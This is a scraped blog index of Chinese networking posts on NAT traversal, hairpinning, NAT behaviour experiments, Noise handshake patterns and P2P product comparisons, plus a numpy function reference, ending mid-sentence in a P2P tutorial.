192.168.1.2:1234--\u0026gt;2.2.2.2:2001 ttl=5 P1-\u0026gt;\u0026gt;P2: 192.168.1.2:1234--\u0026gt;2.2.2.2:2002 ttl=5 P1-\u0026gt;\u0026gt;P2: ... P2-\u0026gt;\u0026gt;P1: 192.168.1.2:1234--\u0026gt;1.1.1.1:5678 P2-\u0026gt;\u0026gt;P1: 192.168.1.2:1234--\u0026gt;1.1.1.1:5678 P2-\u0026gt;\u0026gt;P1: 192.168.1.2:1234--\u0026gt;1.1.1.1:5678 P2-\u0026gt;\u0026gt;P1: ... P2-\u0026gt;\u0026gt;P1: msg 如上图，图中省略了NAT1和NAT2\n穿透步骤如下：\n通过coordinator确定NAT1为非对称型，NAT2为对称型，得到P1的外网端口（这里为5678） P1以固定端口（这里为1234）向P2的不同端口发送大量短TTL报文 P2向P1的外网端口发送大量报文 直到P1收到P2发送的报文，此时穿透成功 原理： 由于对称NAT无法预知外网端口，所以此方法实际是从非对称端出发，去碰撞对称NAT映射的端口\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/nat-%E7%A9%BF%E9%80%8F/","title":"NAT 穿透"},{"content":"NAT 回流问题 现象 通过在路由器上进行端口映射，将局域网主机暴露到公网。不在此局域网内的主机可通过公网 IP 直接访问该局域网主机，但是和局域网主机同一个局域网的主机不能通过公网 IP 访问该局域网主机。\n原因 当同一局域网主机通过公网 IP 访问时，由于路由规则，数据包会被发送到路由器。\n在路由器上此时同时存在两种NAT规则，SNAT和DNAT：\nSNAT 主要目的是让是让源地址为内网网段的数据包的源地址转换为 WAN口IP； DNAT 主要目的是让目的地址为 WAN 口 IP，且端口为映射的端口的数据包的目的地址转换为内网主机的IP和端口。 当内网主机通过公网 IP 访问时，在路由器上会同时匹配两条NAT规则，导致数据包的目的IP和源IP都发生改变。从而导致了路由器的丢包。\n解决方案 增加 NAT 规则，让局域网主机访问端口映射主机时把源地址改为路由器 LAN 口地址。这样回包就会经过路由器进行转换，请求主机就能正常处理； 内网进行 DNS 劫持。外部访问时解析为公网地址，内网访问时解析为内网地址； 启用 Haripin 模式。在 Hairpin 模式下，内网流量全部会做一次源端口转换（这种会比较影响性能，大多数路由器也不支持这个功能）。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/nat-%E5%9B%9E%E6%B5%81%E9%97%AE%E9%A2%98/","title":"NAT 回流问题"},{"content":"NAT 类型探测 RFC 5780 和 RFC 3489 对应关系 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/nat-%E7%B1%BB%E5%9E%8B%E6%8E%A2%E6%B5%8B/","title":"Nat 类型探测"},{"content":"NAT 行为测试实验 实验目的：测试 NAT 的 Filtering Behavior\n实验一：测试 C 端 NAT Filtering Behavior 老化时间 实验步骤：\nS 端启动服务进程，等待接收 C 端发送来的数据。S端接收到C端数据后开始递增间隔（每次增加1s）向C端发送数据 C 端向 S 端发送数据，并等待接收响应，响应接收成功后停止向S端发送数据，转而向一个S1端定时发送数据(防止NAT Mapping Behavior过期) 找出C端接收不到数据的时间间隔，进行下一步测试 C 端向 S 端发送数据，并等待接收响应，响应接收成功后停止向S端发送数据 S 端启动服务进程，等待接收 C 端发送来的数据。S端接收到C端数据后，以最大时间间隔（左右偏移五秒，依次递增）向C端发送数据，判断C端能否收到数据，如果不能收到数据，那么结束实验；如果能收到数据，进行下一步判断 S 端启动服务进程，等待接收 C 端发送来的数据。S端接收到C端数据后，以C端第一次收到数据的时间到最后一次收到数据的时间间隔（左右偏移十秒，依次递增）向C端发送数据，判断C端能否收到数据，如果不能收到数据，那么结束实验； 实验数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 测试1 # 第一次收到数据的时间 2023/04/21 15:24:01 recv from 116.62.229.23:22345 data: I\u0026#39;m Server # 最后一次接收到数据的时间 2023/04/21 15:56:35 recv from 116.62.229.23:22345 data: I\u0026#39;m Server 2023/04/21 15:56:35 use time: 1m2.0594247s # 测试2 # 第一次收到数据的时间 2023/04/21 16:01:06 recv from 116.62.229.23:22345 data: I\u0026#39;m Server # 最后一次接收到数据的时间 2023/04/21 16:37:58 recv from 116.62.229.23:22345 data: I\u0026#39;m Server 2023/04/21 16:37:58 use time: 1m6.0623072s # 测试3 # 第一次收到数据的时间 2023/04/21 16:44:57 recv from 116.62.229.23:22345 data: I\u0026#39;m Server # 最后一次接收到数据的时间 2023/04/21 17:03:39 recv from 116.62.229.23:22345 data: I\u0026#39;m Server 2023/04/21 17:03:39 use time: 1m8.062157s # 测试4 # 第一次收到数据的时间 2023/04/21 17:08:48 start send data to 116.62.229.23:22346 # 最后一次接收到数据的时间 2023/04/21 17:10:56 recv from 116.62.229.23:22345 data: I\u0026#39;m Server 2023/04/21 17:10:56 use time: 1m6.062787s 实验结论：\n电信 NAT Filtering Behavior 规则有效时间大约在 1min 左右。\n实验二：测试 C 端 NAT Mapping Behavior 老化时间 实验步骤：\nC 端向 STUN 服务器间隔递增（每次递增10s）的方式发送请求，STUN返回公网NAT映射的端口，当返回的映射端口与之前公网端口不同时，代表NAT Mapping Behavior已经过期 实现数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 第一次发送数据的时间 2023-04-24 12:51:31.097 [INFO] {94b69e6bc0c558178c6447135a63c9aa} wait: 0s, addr: 182.139.187.130:37614 # 最后发送数据的时间 2023-04-24 13:26:32.053 [INFO] {94b69e6bc0c558178c6447135a63c9aa} wait: 210s, addr: 182.139.187.130:37614 2023-04-24 13:30:02.108 [INFO] {94b69e6bc0c558178c6447135a63c9aa} 182.139.187.130:37614 182.139.187.130:37655 # 第一次发送数据的时间 2023-04-24 14:41:53.318 [INFO] {a0690c47c6cb5817b9ac6a7a8cc5381b} wait: 100s, addr: 182.139.187.128:19774 # 最后发送数据的时间 2023-04-24 15:06:03.769 [INFO] {a0690c47c6cb5817b9ac6a7a8cc5381b} wait: 200s, addr: 182.139.187.128:19774 2023-04-24 15:09:23.809 [INFO] {a0690c47c6cb5817b9ac6a7a8cc5381b} 182.139.187.128:19774 182.139.187.128:19788 # 第一次发送数据的时间 2023-04-24 15:13:04.104 [INFO] {d41be8d979cd581708977d6136a21b22} wait: 180s, addr: 182.139.187.128:19272 # 最后发送数据的时间 2023-04-24 15:16:04.163 [INFO] {d41be8d979cd581708977d6136a21b22} wait: 190s, addr: 182.139.187.128:19272 2023-04-24 15:19:14.217 [INFO] {d41be8d979cd581708977d6136a21b22} 182.139.187.128:19272 182.139.187.128:19049 # 第一次发送数据的时间 2023-04-24 16:45:53.822 [INFO] {e4757c898ad25817656893318357add7} wait: 180s, addr: 182.139.187.130:37062 # 最后发送数据的时间 2023-04-24 16:52:03.930 [INFO] {e4757c898ad25817656893318357add7} wait: 200s, addr: 182.139.187.130:37062 2023-04-24 16:55:23.975 [INFO] {e4757c898ad25817656893318357add7} 182.139.187.130:37062 182.139.187.130:38383 实验结论：\n根据多次实验得到的数据判断电信运营商的NAT Mapping Behavior规则老化时间在 3min 左右。\n实验三：测试 C 端 NAT Filtering Behavior 容量 实验步骤：\nC 端向 S 端一定范围内服务端端口发送数据，用以在 NAT 上添加 NAT Filtering Behavior 规则，C 端发送完毕后进入等待数据接收状态 S 端随机选择 20% C端已经发送给服务端的端口列表，新建套接字向 C 端发送数据，判断 C 端是否出现丢包情况 重复实验，直到找到极限值 实验数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 尝试用500 2023-04-25 10:18:27.571 [INFO] {2069eac9fa0b591792bbba1b46be6ff5} send over, use 8.0016ms 2023/04/25 10:18:34 execute 0 times,loss packet: 0.00% ...... 2023-04-25 11:33:03.031 [INFO] {2069eac9fa0b591792bbba1b46be6ff5} send over, use 12.9997ms 2023/04/25 11:33:10 execute 5 times,loss packet: 0.00% # 尝试用800 2023-04-25 15:39:54.627 [INFO] {d470a967851d59170818856cef2101d2} send over, use 14.3895ms 2023/04/25 15:40:01 execute 0 times,loss packet: 0.00% 2023-04-25 15:50:01.753 [INFO] {d470a967851d59170818856cef2101d2} send over, use 12.3033ms 2023/04/25 16:00:00 execute 1 times,loss packet: 0.00% 2023-04-25 16:10:00.249 [INFO] {d470a967851d59170818856cef2101d2} send over, use 15ms 2023/04/25 16:12:01 execute 2 times,loss packet: 20.00% ...... 2023-04-25 16:52:10.521 [INFO] {d470a967851d59170818856cef2101d2} send over, use 13.362ms 2023/04/25 16:54:29 execute 5 times,loss packet: 22.00% 2023-04-25 17:04:29.983 [INFO] {d470a967851d59170818856cef2101d2} send over, use 11.7844ms 实验结论：\n根据实验发现当产生发包量为 500 时（500条 NAT Filtering Behavior）， 运营商 NAT 没有出现对流量进行风控情况；当产生发包量为 800 时（800条 NAT Filtering Behavior）， 运营商 NAT 出现了流量进行风控情况。\n根据实验，500 条是一个较为合适的NAT Filtering Behavior数量。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/nat-%E8%A1%8C%E4%B8%BA%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C/","title":"NAT 行为测试实验"},{"content":"Noise 协议握手模式详解 一、Noise协议简介 Noise是一个基于 Diffie-Hellman（DH）密钥交换的加密协议框架，旨在提供一种灵活而安全的加密通信方式。Noise通过定义不同的握手模式（Handshake Patterns），来满足不同应用场景下的安全需求。这些模式决定了如何在两个参与方之间交换密钥以建立安全通信会话。\n二、握手模式概述 Noise协议提供了一系列握手模式，每种模式都有其特定的用途和安全属性。以下是这些模式的简要概述：\n1. 基本概念 在深入分析各个模式之前,我们需要理解一些基本概念:\n静态密钥对(s): 长期使用的公私钥对 临时密钥对(e): 每次会话新生成的公私钥对 预共享密钥(psk): 双方提前约定的密钥 握手消息: 用于建立安全通道的初始消息交换 传输数据: 握手完成后的加密通信 2. 基本模式 NN：双方都没有静态密钥，仅使用临时密钥进行DH交换。 NK：发起方没有静态密钥，但知道响应方的静态公钥，支持零RTT加密。 NX：发起方没有静态密钥，响应方在握手过程中发送其静态公钥。 XN：发起方在握手过程中发送其静态公钥，响应方没有静态密钥。 XK：双方交换静态公钥，提供双向认证和零RTT加密。 XX：双方在握手过程中交换静态公钥，提供双向认证。 KN：响应方已知发起方的静态公钥，支持零RTT加密。 KK：双方都已知对方的静态公钥，支持双向认证和零RTT加密。 KX：发起方已知响应方的静态公钥，响应方在握手过程中发送其静态公钥。 IN：发起方在第一次消息中立即发送其静态公钥，减少或没有身份隐藏。 IK：发起方立即发送其静态公钥，响应方的静态公钥已知给发起方。 IX：发起方立即发送其静态公钥，响应方在握手过程中发送其静态公钥。 3. 延迟模式 NK1、XK1、XX1等：这些模式在握手过程中推迟了认证DH操作的执行。 4. 预共享密钥（PSK）模式 Npsk0、Kpsk0、Xpsk1等：加入了预共享密钥（PSK），以增强安全性。 5. 其他模式 Fallback模式：允许在握手失败时回退到其他模式。 三、握手流程与适用场景分析 1. NN模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e] --\u0026gt; B[Responder \u0026lt;- e, ee] 适用场景：\n临时或匿名通信：如在线聊天室、即时通讯应用中的临时会话。 示例软件：\n一些即时通讯应用，如Signal的匿名模式。 为什么选择NN模式：\n简单、快速，不需要任何身份认证，适合不需要长期通信的场景。 2. NK模式 握手流程：\nflowchart TD A[Responder \u0026lt;- s] --\u0026gt; B[...] B --\u0026gt; C[Initiator -\u0026gt; e, es] C --\u0026gt; D[Responder \u0026lt;- e, ee] 适用场景：\n零RTT加密：如VPN客户端连接到已知服务器。 示例软件：\nVPN软件，如OpenVPN或WireGuard。 为什么选择NK模式：\n提供零RTT加密，适合需要立即加密数据的场景。 3. NX模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e] --\u0026gt; B[Responder \u0026lt;- e, ee, s, es] 适用场景：\n客户端到服务器连接：如在线服务的客户端需要验证服务器身份。 示例软件：\n在线游戏客户端连接到服务器。 为什么选择NX模式：\n提供响应方认证，适合需要验证服务端身份但不提供零RTT加密的场景。 4. XN模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e] --\u0026gt; B[Responder \u0026lt;- e, ee] B --\u0026gt; C[Initiator -\u0026gt; s, se] 适用场景：\n客户端认证：如客户端需要向服务器证明自己的身份。 示例软件：\n云存储客户端认证。 为什么选择XN模式：\n提供发起方认证，适用于需要客户端认证的场景。 5. XK模式 握手流程：\nflowchart TD A[Responder \u0026lt;- s] --\u0026gt; B[...] B --\u0026gt; C[Initiator -\u0026gt; e, es] C --\u0026gt; D[Responder \u0026lt;- e, ee] D --\u0026gt; E[Initiator -\u0026gt; s, se] 适用场景：\n双向认证和零RTT加密：如安全的客户端-服务器通信。 示例软件：\n安全的邮件客户端或云服务。 为什么选择XK模式：\n提供双向认证和零RTT加密，适合需要高安全性和立即加密通信的场景。 6. XX模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e] --\u0026gt; B[Responder \u0026lt;- e, ee, s, es] B --\u0026gt; C[Initiator -\u0026gt; s, se] 适用场景：\n双向认证：如VPN连接、安全的P2P通信。 示例软件：\nVPN软件如WireGuard。 为什么选择XX模式：\n提供双向认证，适用于需要双方都验证身份的场景。 7. KN模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; s] --\u0026gt; B[...] B --\u0026gt; C[Initiator -\u0026gt; e] C --\u0026gt; D[Responder \u0026lt;- e, ee, se] 适用场景：\n零RTT加密：如服务器主动联系已知的客户端。 示例软件：\n企业内部的自动更新服务。 为什么选择KN模式：\n提供零RTT加密，适合需要立即加密通信的场景。 8. KK模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; s] --\u0026gt; B[Responder \u0026lt;- s] B --\u0026gt; C[...] C --\u0026gt; D[Initiator -\u0026gt; e, es, ss] D --\u0026gt; E[Responder \u0026lt;- e, ee, se] 适用场景：\n高安全性需求：如企业内网通信。 示例软件：\n企业级VPN或安全通信软件。 为什么选择KK模式：\n提供双向认证和零RTT加密，适合需要极高安全性的场景。 9. KX模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; s] --\u0026gt; B[...] B --\u0026gt; C[Initiator -\u0026gt; e] C --\u0026gt; D[Responder \u0026lt;- e, ee, se, s, es] 适用场景：\n安全的客户端-服务器通信：如需要双向认证的在线服务。 示例软件：\n安全的云存储服务。 为什么选择KX模式：\n提供双向认证，适合需要验证双方身份的场景。 10. IN模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e, s] --\u0026gt; B[Responder \u0026lt;- e, ee, se] 适用场景：\n客户端主动认证：如客户端需要立即验证身份。 示例软件：\n在线支付或银行客户端。 为什么选择IN模式：\n提供发起方立即认证，适用于需要立即验证身份的场景。 11. IK模式 握手流程：\nflowchart TD A[Responder \u0026lt;- s] --\u0026gt; B[...] B --\u0026gt; C[Initiator -\u0026gt; e, es, s, ss] C --\u0026gt; D[Responder \u0026lt;- e, ee, se] 适用场景：\n双向认证：如VPN连接。 示例软件：\nVPN软件如OpenVPN。 为什么选择IK模式：\n提供双向认证和零RTT加密，适合需要立即验证身份和加密通信的场景。 12. IX模式 握手流程：\nflowchart TD A[Initiator -\u0026gt; e, s] --\u0026gt; B[Responder \u0026lt;- e, ee, se, s, es] 适用场景：\n双向认证：如高安全性需求的P2P通信。 示例软件：\n安全的P2P文件共享软件。 为什么选择IX模式：\n提供双向认证，适用于需要双方立即验证身份的场景。 四、延迟模式与PSK模式 1. 延迟模式 延迟模式（如NK1、XK1、XX1等）推迟了认证操作，提供更好的身份隐藏和灵活性。\n适用场景：\n身份隐藏：如在某些情况下需要更好的身份隐藏或更灵活的认证方式。 示例软件：\n需要高匿名性的通信软件。 为什么选择延迟模式：\n提供更好的身份隐藏和认证灵活性，适合需要保护参与方身份的场景。 2. PSK模式 预共享密钥（PSK）模式（如Npsk0、Kpsk0、Xpsk1等）引入了预共享密钥，以增强安全性。\n适用场景：\n额外安全层：如IoT设备通信、企业内部网络通信。 示例软件：\n智能家居设备的通信协议。 为什么选择PSK模式：\n使用预共享密钥增强安全性，适用于需要额外安全层或预共享密钥的场景。 五、总结 Noise协议通过提供多种握手模式，满足了不同应用场景下的安全需求：\n基本模式：如NN、NK、NX等，适用于基本的加密需求。 延迟模式：如NK1、XK1等，提供更好的身份隐藏和灵活性。 PSK模式：如Npsk0、Kpsk0等，适用于需要预共享密钥增强安全性的场景。 选择合适的握手模式需要考虑认证需求、前向安全性需求、是否需要零RTT加密，以及是否需要使用预共享密钥等因素。每个模式都为不同的使用场景提供了特定的安全属性和通信方式，确保了通信的安全性和效率。通过本报告的分析，第一次接触Noise的人可以更好地理解这些模式的应用场景和选择依据。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/noise-%E5%8D%8F%E8%AE%AE%E6%8F%A1%E6%89%8B%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/","title":"Noise 协议握手模式详解"},{"content":"1. 比较运算符 符号 函数 含义 \u0026gt; np.greater(arr1, arr2) 判断 arr1 的元素是否大于 arr2 的 \u0026gt;= np.greater_equal(arr1, arr2) 判断 arr1 的元素是否大于等于 arr2 的 \u0026lt; np.less(arr1, arr2) 判断 arr1 的元素是否小于 arr2 的 \u0026lt;= np.less_equal(arr1, arr2) 判断 arr1 的元素是否小于等于 arr2 的 == bp.equal(arr1, arr2) 判断 arr1 的元素是否等于 arr2 的 != np.not_equal(arr1, arr2) 判断 arr1 的元素是否不等于 arr2 的 2. 常用数学函数 函数 函数说明 np.pi 常数Π np.e 常数e np.fabs(arr) 计算各元素的浮点型绝对值 np.ceil(arr) 对各元素向上取整 np.floor(arr) 对各元素向下取整 np.round(arr) 对各元素四舍五入 np.fmod(arr1, arr2) 计算 arr1 / arr2 的余数 np.modf(arr) 返回数组元素小数部分和整数部分 np.sqrt(arr) 计算各元素的算术平方根 np.square(arr) 计算各元素的平方根 np.exp(arr) 计算以 e 为底的指数 np.power(arr, α) 计算各元素的指数 np.log2(arr) 计算以 2 为底各元素的对数 np.log10(arr) 计算以 10 为底各元素的对数 np.log(arr) 计算以 e 为底各元素的对数 3. 统计函数 函数 函数说明 np.min(arr, axis) 按照轴的方向计算最小值 np.max(arr, axis) 按照轴的方向计算最大值 np.mean(arr, axis) 按照轴的方向计算均值 np.median(arr, axis) 按照轴的方向计算中位数 np.sum(arr, axis) 按照轴的方向计算和 np.std(arr, axis) 按照轴的方向计算标准差 np.var(arr, axis) 按照轴的方向计算方差 np.cumsum(arr, axis) 按照轴的方向计算累计和 np.cumprod(arr, axis) 按照轴的方向计算累计乘积 np.argmin(arr, axis) 按照轴的方向计算最小值所在的位置 np.argmax(arr, axis) 按照轴的方向计算最大值所在的位置 np.corrcoef(arr) 计算皮尔逊相关系数 np.cov(arr) 计算协方差矩阵 注：axis=1时按水平方向计算，为0时按垂直方向计算\n4. 线性代数相关计算 函数 函数说明 np.zeros 生成零矩阵 np.eye 生成单位矩阵 np.dot 计算两个数组的点积 np.diag 矩阵主对角线与一维数组间的转换 np.ones 生成所有元素为 1 的矩阵 po.transpose 矩阵转置 np.inner 计算两个数组的内积 np.trace 矩阵主对角线元素的和 np.linalg.det 计算矩阵行列式 np.linalg.eigvals 计算方阵特征根 np.linalg.pinv 计算方阵的 Moore-Penrose 伪逆 np.linalg.lstsq 计算 Ax=b 的最小二乘解 np.linalg.svd 计算奇异值分解 np.linalg.eig 计算矩阵特征根与特征向量 np.linalg.inv 计算方阵的逆 np.linalg.solve 计算 Ax=b 的线性方程组解 np.linalg.qr 计算 QR 分解 np.linalg.norm 计算向量或矩阵的范数 5. 伪随机数的生成 函数 函数说明 seed(n) 设置随机数种子 beta(a, b, size=None) 生成 β 分布随机数 chisquare(df, size=None) 生成卡方分布随机数 choice(a, size=None, replace=True, p=None) 从 a 中有放回地随机挑选指定数量地样本 exponential(scale=1.0, size=None) 生成指数分布随机数 f(dfnum, dfden, size=None) 生成 F 分布随机数 gamma(shape, scale=1.0, size=None) 生成 Γ 分布随机数 geometric(p, size=None) 生成几何分布随机数 hypergeometric(ngood, nbad, nsample, size=None) 生成超几何分布随机数 laplace(loc=0.0, scale=1.0, size=None) 生成拉普拉斯分布随机数 logistic(loc=0.0, scale=1.0, size=None) 生成 Logistic 分布随机数 lognormal(mean=0.0, sigma=1.0, size=None) 生成对数正态分布随机数 negative_binomial(n, p, size=None) 生成负二项分布随机数 multinomial(n, pvals, size=None) 生成多项分布随机数 multivariate_normal(mean, cov[, size]) 生成多元正态分布随机数 normal(loc=0.0, scale=1.0, size=None) 生成正态分布随机数 pareto(a, size=None) 生成帕累托分布随机数 poisson(lam=1.0, size=None) 生成泊松分布随机数 rand(d0, d1, .., dn) 生成 n 维的均匀分布随机数 randn(d0, d1, \u0026hellip;, dn) 生成 n 维的标准正态分布随机数 randint(low, high=None, size=None, dtype=\u0026lsquo;1\u0026rsquo;) 生成指定范围的随机整数 random_sample(size=None) 生成 [0, 1) 的随机数 standard_t(df, size=None) 生成标准的 t 分布随机数 uniform(low=0.0, high=1.0, size=None) 生成指定范围的均匀分布随机数 wald(mean, scale, size=None) 生成 Wald 分布随机数 weibull(a, size=None) 生成 Weibull 分布随机数 注：以上随机数生成函数位于 numpy 模块的 random 子模块\n6. 其它常用函数 函数 函数说明 arange 类似于 Python 的内建函数 range array 构造数组对象 ix_ 构造数组索引 genfromtxt 读取文本文件数据的函数 shape 返回数组形状 ndim 返回数组维数 size 返回数组元素个数 dtype 返回数组数据类型 reshape 重塑数组形状 resize 重塑数组形状 flatten 将多维数组降为一维数组 ravel 将多维数组降为一维数组 vstack、row_stack 数组的垂直堆叠函数 hstack、column_stack 数组的水平合并函数 where 类似于 Excel 的 if 函数 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/numpy-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%B8%8E%E6%96%B9%E6%B3%95/","title":"numpy 常用函数与方法"},{"content":" 网络环境 \\ 产品 WebRTC libp2p syncthing tailscale PP透（绿联） 节点小宝 IPv6 - IPv6 支持 支持 支持 支持 不支持 不支持 Port Restricted Cone NAT - Port Restricted Cone NAT 支持 支持 支持 支持 支持 支持 一端位于 NAT 下，一端位于 NAT 上 支持 支持 支持 支持 支持 支持 Port Restricted Cone NAT - Symmetric NAT 不支持 不支持 不支持 不支持 支持端口预测 不支持 具有防护规则的防火墙(需要先用短TTL打洞) 不支持 不支持 不支持 不支持 支持 支持 能够依靠 UPnP/NAT-PMP/PCP进行端口映射的路由器 不支持 支持 支持 支持 不支持 不支持 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/p2p-%E4%BA%A7%E5%93%81%E8%83%BD%E5%8A%9B%E8%B0%83%E7%A0%94/","title":"P2P 产品能力调研"},{"content":" 大部分手机的 IPv6 是可以直通的 运营商没有对 IPv6 设置防火墙，IPv6 的防火墙是在光猫上设置的 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/p2p-%E7%BB%8F%E9%AA%8C/","title":"P2P 经验"},{"content":"P2P 时遇到端口被改的坑 在尝试 Port Restricted Cone NAT 到 Port Restricted Cone NAT 的 P2P 时遇到一个很灵异的现象，UDP 套接字发往 STUN 的数据包能够正常回包，但是进行打洞时出现了端口被更改的现象。路由器上 tcpdump 抓包如下：\n15:56:16.555958 IP 11.11.11.11.1065 \u0026gt; 22.22.22.22.23215: UDP, length 40 15:56:17.307864 IP 11.11.11.11.60094 \u0026gt; 33.33.33.33.3478: UDP, length 40 15:56:17.309272 IP 11.11.11.11.60094 \u0026gt; 44.44.44.44.3478: UDP, length 40 可以发现发往 33.33.33.33 和 44.44.44.44 两个 STUN 服务器的 src port 是正常的，但是发往 22.22.22.22 的 src port 却被改为了 1065.\n经过排查后，发现如果 22.22.22.22:23215 在 11.11.11.11.60094 发送过数据包之前到达了路由器，路由器会将端口更改为另外一个随机端口（应该是一种防火墙规则，防止udp端口被外部碰撞攻击）。\n解决方案：\n更改打洞流程，打洞时采用短 ttl 包打开本地防火墙，再使用正常 ttl 的包来建立连接。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/p2p-%E6%97%B6%E9%81%87%E5%88%B0%E7%AB%AF%E5%8F%A3%E8%A2%AB%E6%94%B9%E7%9A%84%E5%9D%91/","title":"P2P 时遇到端口被改的坑"},{"content":"一、P2P技术概述 1.1 什么是P2P技术 P2P的定义与特点 P2P（Peer-to-Peer，点对点）技术是一种网络通信模型，它允许网络中的参与者（节点）直接相互通信和共享资源，而无需依赖中央服务器作为中介。在P2P网络中，每个节点既可以是资源的提供者（服务器），也可以是资源的消费者（客户端）。\nP2P网络的主要特点：\n去中心化：没有中央控制节点，网络中的每个节点地位平等 自组织性：网络能够自动适应节点的加入和离开 资源共享：计算能力、存储空间和网络带宽等资源可以在节点间共享 可扩展性：随着节点数量增加，网络整体资源和服务能力也相应增加 冗余性：数据和服务通常在多个节点上复制，提高了系统的容错能力 与传统C/S架构的区别 特性 传统C/S（客户端/服务器）架构 P2P（点对点）架构 中心化程度 高度中心化，服务器作为核心 去中心化，节点平等 资源分布 资源集中在服务器端 资源分布在所有参与节点 可扩展性 受限于服务器性能，扩展成本高 随节点增加自然扩展，成本分摊 稳定性 服务器故障导致整体服务中断 单个节点故障影响有限 带宽利用 服务器带宽易成为瓶颈 带宽需求分散到各节点 实现复杂度 相对简单，架构清晰 较为复杂，需处理各种网络环境 安全控制 集中式安全控制，相对容易 分散式安全控制，挑战较大 P2P网络的优势与挑战 优势：\n高效利用资源：充分利用边缘节点的计算能力、存储空间和网络带宽 降低成本：减少对中央服务器的依赖，降低基础设施和运维成本 提高可靠性：去中心化结构消除了单点故障风险 自然扩展：网络容量随着参与节点的增加而自然增长 抗审查性：分布式特性使得网络更难被审查或关闭 挑战：\n网络穿透问题：NAT和防火墙环境下的连接建立困难 节点发现与管理：如何高效发现和管理动态变化的节点 安全与信任：缺乏中央权威，节点间的信任建立机制复杂 服务质量保障：节点性能和连接质量参差不齐，难以保证一致的服务质量 法律与合规：在某些地区面临法律监管挑战，特别是涉及版权内容时 资源不均衡：\u0026ldquo;搭便车\u0026quot;现象（部分节点只消费不贡献）影响网络效率 1.2 P2P技术的发展历程 早期P2P应用（1999-2005） Napster时代（1999-2001）：\n1999年，Shawn Fanning创建了Napster，这是第一个广为人知的P2P文件共享应用 Napster采用了中心化索引 + P2P传输的混合架构，用户通过中央服务器查找音乐文件，但文件传输直接在用户之间进行 2001年因版权诉讼而被迫关闭，但它开创了P2P文件共享的先河 去中心化探索（2000-2003）：\nGnutella（文件共享网络）：2000年发布，首个完全去中心化的P2P网络，采用泛洪（Flooding）搜索机制 Freenet：2000年推出，注重匿名性和抗审查能力的 P2P 网络 Kazaa/FastTrack：2001年推出，引入了超级节点（Supernode）概念，形成两级架构 eDonkey/eMule：2002年出现，引入了服务器网络和文件哈希技术 BitTorrent革命（2003-2005）：\n2001年，Bram Cohen设计了BitTorrent协议，2003年开始广泛应用 创新性地引入了分片下载、稀有优先和互惠机制（tit-for-tat） 显著提高了大文件分发效率，至今仍是最成功的P2P协议之一 现代P2P技术的演进（2005-2020） 结构化P2P网络（2005-2010）：\n**分布式哈希表（DHT）**技术成熟：Kademlia、Chord、Pastry等算法广泛应用 BitTorrent网络引入DHT，摆脱了对Tracker服务器的依赖 学术界和工业界对P2P网络路由和查找算法进行了深入研究 P2P流媒体时代（2008-2015）：\nP2P技术在视频直播领域得到应用：PPTV、PPS影音等 P2P-CDN混合架构出现，如迅雷看看、阿里云PCDN WebRTC（2011年发布）标准化了浏览器中的P2P通信能力 区块链与去中心化应用（2009-至今）：\n2009年比特币网络上线，将P2P技术与密码学、共识机制相结合 2015年以太坊推出，支持智能合约，催生了大量去中心化应用（DApps） IPFS（星际文件系统）在2015年推出，致力于构建去中心化的文件存储和访问系统 未来发展趋势 Web3.0与去中心化互联网：\n基于区块链的去中心化身份和数据所有权 去中心化存储和计算平台的普及 用户直接控制和变现自己的数据和创作内容 边缘计算与P2P结合：\n利用边缘设备的闲置计算资源构建分布式计算网络 降低云计算中心的负载和延迟 物联网设备间的直接P2P通信和协作 5G/6G网络中的应用：\n高带宽、低延迟网络环境为P2P应用提供更好基础 设备直连（Device-to-Device，D2D）通信技术与P2P结合 移动边缘计算（MEC）中的P2P资源共享 安全与隐私增强：\n零知识证明等密码学技术在P2P网络中的应用 去中心化隐私保护机制的发展 抗量子计算的P2P安全协议研究 二、NAT类型详解 3.1 NAT基础知识 NAT（Network Address Translation，网络地址转换）是一种在IP数据包通过路由器或防火墙时重写来源IP地址或目的IP地址的技术。它主要用于解决IPv4地址短缺问题，允许多个设备通过单个公网IP地址访问互联网。\nNAT的主要作用：\n地址复用：允许多个私有IP地址共享一个公网IP地址 网络安全：隐藏内部网络结构，防止外部直接访问内部主机 负载均衡：在某些实现中用于分发流量 端口复用：通过端口号区分不同内部主机的连接 NAT的工作原理 NAT通常部署在网络边界设备（如路由器）上，当内部主机向外部发送数据包时，NAT设备会：\n来源地址转换：将私有来源IP和端口替换为公网IP和临时端口 维护转换表：记录转换关系（内部IP:端口 -\u0026gt; 公网IP:端口） 转发数据包：将修改后的数据包发送到外部网络 反向转换：当响应数据包返回时，根据转换表还原为内部IP和端口 基本NAT转换流程示例：\n内部主机A (192.168.1.10:1234) 发送数据到外部服务器B (8.8.8.8:53) NAT设备将来源改为公网IP (203.0.113.1:5678) 响应从B返回到203.0.113.1:5678 NAT根据表转换为192.168.1.10:1234并转发 公网IP与私网IP 公网IP（Public IP）：\n由IANA分配的全球唯一IP地址 可在互联网上直接路由 